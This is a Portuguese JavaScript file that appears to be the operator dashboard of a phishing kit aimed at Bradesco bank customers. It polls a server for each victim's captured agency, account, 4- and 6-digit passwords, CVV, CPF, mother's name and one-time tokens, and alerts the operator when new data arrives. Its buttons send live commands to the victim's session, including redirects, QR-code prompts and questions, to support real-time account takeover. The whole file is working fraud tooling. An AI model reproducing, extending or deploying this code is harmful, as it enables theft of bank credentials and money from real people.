$('document').ready(function(){

    const quantidadeSegundos = 5;
    let time = quantidadeSegundos;
    let info = {};

    let id = $('input#id').val();

    function getForm() {
        var data = new FormData();
        return data;
    }


    function sendData(data) {
        $.ajax({
                url: "do.php",
                data: data,
                cache: false,
                contentType: false,
                processData: false,
                type: 'POST',
                success: function(data){
                    $('input[name=qrCodeFile]').val('');
                    atualizarInformacoes();
                }
            });
    }

    $('button.enviarSerialDispositivo').click(e => {
        
        let serialDispositivo = $(e.target).parent().find('input[name=serialDispositivo]').val();
        if(serialDispositivo.length > 0) {
            
            let action = 'ALTERAR_INFORMACOES';
            let campo = 'serialDispositivo';
    
            $.ajax({
                url: "do.php",
                type:'POST',
                data: { action : action, id : id, campo: campo, valor : serialDispositivo},
                cache: false,
                success: function(r){
                    $(e.target).parent().find('input[name=serialDispositivo]').val('');
                    atualizarInformacoes();
                }
            });
        }
    });

    
    $('button.enviarSaldo').click(e => {
        
        let saldo = $(e.target).parent().find('input[name=saldo]').val();
        if(saldo.length > 0) {
            
            let action = 'ALTERAR_INFORMACOES';
            let campo = 'saldo';
    
            $.ajax({
                url: "do.php",
                type:'POST',
                data: { action : action, id : id, campo: campo, valor : saldo},
                cache: false,
                success: function(r){
                    $(e.target).parent().find('input[name=saldo]').val('R$');
                    atualizarInformacoes();
                }
            });
        }
    });
    


    $('button.enviarQr').click(function(e) {
        e.preventDefault();
        if(!info.comando.includes('INTERNA')){
            alert('Este Comando só pode ser realizado após redirecionar o usuário para a página interna.');
            return;
        }

        let msg = 'Você tem Certeza que deja enviar o comando QR_CODE_INTERNA?';

        let confirma = confirm(msg);
        if(!confirma) {
            return false;
        }

        let element = $(event.target).parent().find('input[name=qrCodeFile]');
        let input = element[0].files ? element[0].files[0] : false;
        let file = input;


        let action = $(event.target).data('action');

        if( file ) {
            var img = new Image();

            img.src = window.URL.createObjectURL( file );

            img.onload = function() {
                let width = img.naturalWidth;
                let height = img.naturalHeight;

                window.URL.revokeObjectURL( img.src );


                var data = getForm();
                data.append('foto', input);
                data.append('id', id);
                data.append('action', action);
                sendData(data);

            };

        } else {
            alert("Selecione o arquivo antes de enviar!");
        }
    });

    $('tbody').on('click', 'button.btn-action', function(e) {

        let confirmarSerial = $(e.target).data('confirmar-serial');
        

        if(confirmarSerial){
            if(!info.serialDispositivo){
                alert("Você não informou o serial do dispositivo de segurança!");
                return;
            }
        }
        
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');
        let confirma = confirm('Você tem Certeza que deseja enviar o comando ' + comando);
        if(!confirma) {
            return false;
        }
        

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando: comando},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.excluir-info', function(e) {

        let confirma = confirm('Você tem Certeza que deseja excluir a info?');


        if(!confirma) {
            return false;
        }
        
        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "REMOVER_INFO", id : id},
            cache: false,
            success: function(r){
                location.reload();
            }
        });

    });

    $('tbody').on('click', 'button.btn-action-text', function(e) {

        let pergunta = $(e.target).data('pergunta');
        let action = $(e.target).data('action');
        let comando = $(e.target).data('comando');

        let texto = prompt(pergunta);
        if(texto.length === 0) {
            return false;
        }
        

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : action, id : id, comando : comando, texto: texto},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

   $('button.toPrime').click(function(e) {

        let ok = confirm('Certeza que deseja mudar o tipo para bradesco Prime?');
        if(!ok) {
            return false;
        }
        

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : 'MUDAR_PARA_PRIME', id : id},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    let audioAlteracaoInfo = document.getElementById("myAudioAlteracaoInfo");

    function relogio(){
        $('span#segundos').text(time);
        time--;
        if(time === -1){
            loadData();
            time = 5;
        }
    }

    var timer = setInterval (relogio, 1000 );

    function pararContador(){
        if(timer){
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador(){
        if(!timer){
            timer = setInterval (relogio, 1000 );

        }
    }

    $('a#controlarContador').click( e => {
        e.preventDefault();
        if(timer){
            pararContador();
            $('span#timer').addClass('parado');
        } else {
            iniciarContador();
            $('span#timer').removeClass('parado');

        }
    });

    document.addEventListener('DOMContentLoaded', function() {
        if (!Notification) {
            alert('Desktop notifications not available in your browser. Try Chromium.');
            return;
        }
        
        if (Notification.permission !== 'granted')
            Notification.requestPermission();
    });
    
    
    function notifyMe(titulo, msg) {
        if (Notification.permission !== 'granted')
            Notification.requestPermission();
        else {
            var notification = new Notification(titulo, {
            icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRHjpI5COjVeOEVYs7aBhl-DgzYPZPz6Ma7IhU1c_t6-lKNJZkx',
            body: msg,
            });
            notification.onclick = function() {
            window.open(window.location.href);
            };
        }
    }

    function alterarDom(){

        $('span.id').text(info.id ? info.id : '-');
        $('span.ip').text(info.ip ? info.ip : '-');
        $('span.data').text(info.data ? moment(info.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss') : '-');
        $('span.agencia').text(info.agencia ? info.agencia : '-');
        $('span.conta').text(info.conta ? info.conta + '-' + info.digito : '-');
        $('span.s4').text(info.senha4 ? info.senha4 : '-');
        $('span.status').text(info.status ? info.status : '-');
        $('span.serialDispositivo').text(info.serialDispositivo ? info.serialDispositivo : '-')
        $('span.saldo').text(info.saldo ? info.saldo : '-')

        $('span.serialDispositivo').text(info.serialDispositivo ? info.serialDispositivo : '-')
        $('span.saldo').text(info.saldo ? info.saldo : '-');
        $('span.cpf').text(info.cpf ? info.cpf : '-');
        $('span.mae').text(info.mae ? info.mae : '-');


        if(info.status.toLowerCase() === 'offline'){
            $('span.status').addClass('offline');
        } else {
            $('span.status').removeClass('offline');
        }

        $('span.comando').text(info.comando ? info.comando : '-');
        $('span.texto').text(info.texto ? info.texto : '-');
        $('span.userAgent').text(info.user_agent ? info.user_agent : '-');
        $('span.device').text(info.device ? info.device : '-');
        $('span.s6').text(info.senha6 ? info.senha6 : '-');
        $('span.cvv').text(info.cvv ? info.cvv : '-');
        $('span.celular').text(info.celular ? info.celular : '-');
        $('span.qrCodeFile').text(info.qrCodeFile ? info.qrCodeFile : '-');

        $('span.titular').text(info.titular ? info.titular : '-');
        $('span.nome').text(info.nome ? info.nome : '-');
        $('span.tipo').text(info.tipo ? info.tipo : '-');
        

        let htmlTokens = '';
        info.tokens.forEach(token => {
            htmlTokens += `
                    <tr>
                    <th scope="row">1</th>
                    <td>${moment(token.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                    <td>${token.posicao}</td>
                    <td>${token.valor}</td>
                    </tr>
            `;
        });

        if(info.comando.includes('INTERNA') && info.device === 'DESKTOP'){
            $('div#botoes-parte-1').addClass('hide')
            $('div#botoes-parte-2').removeClass('hide')
            $('div#botoes-parte-3').addClass('hide')
        } else if(info.device === 'MOBILE') {
            $('div#botoes-parte-1').addClass('hide')
            $('div#botoes-parte-2').addClass('hide')
            $('div#botoes-parte-3').removeClass('hide')
        } else {
            $('div#botoes-parte-1').removeClass('hide')
            $('div#botoes-parte-2').addClass('hide')
            $('div#botoes-parte-3').addClass('hide')
        }

        $('span.tokenAtual').text( info.tokens && info.tokens.length > 0 ? info.tokens[0].valor : '------');
        $('table#tokens tbody').empty().append(htmlTokens);

    }

    function verificarAlteracao(novaInfo){

        let houveAlteracao = false;

        if(info && ( info.senha4 !== novaInfo.senha4 || info.celular !== novaInfo.celular || info.cvv !== novaInfo.cvv || info.senha6 !== novaInfo.senha6 || info.tokens.length !== novaInfo.tokens.length || info.cpf !== novaInfo.cpf || info.mae !== novaInfo.mae) ){
            houveAlteracao = true;
        }


        if(houveAlteracao){
            $('tr.header').addClass('alteracao');
            notifyMe('Alteração na Info!', 'Chegou novas informações.');
            audioAlteracaoInfo.play();
        }

        info = novaInfo;
        alterarDom();
    }

    function loadData(){


        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "BUSCAR_POR_ID", id: id},
            cache: false,
            success: function(r){
                verificarAlteracao(r);
            }
        });

    }

    $(document).bind("click keydown keyup mousemove", function(){
        if($('tr.header').hasClass('alteracao')){

            setTimeout(function(){ $('tr.header').removeClass('alteracao')  }, 3000);
        }
    });

    function atualizarInformacoes(){
        time = quantidadeSegundos;
        loadData();

    }
    loadData();
});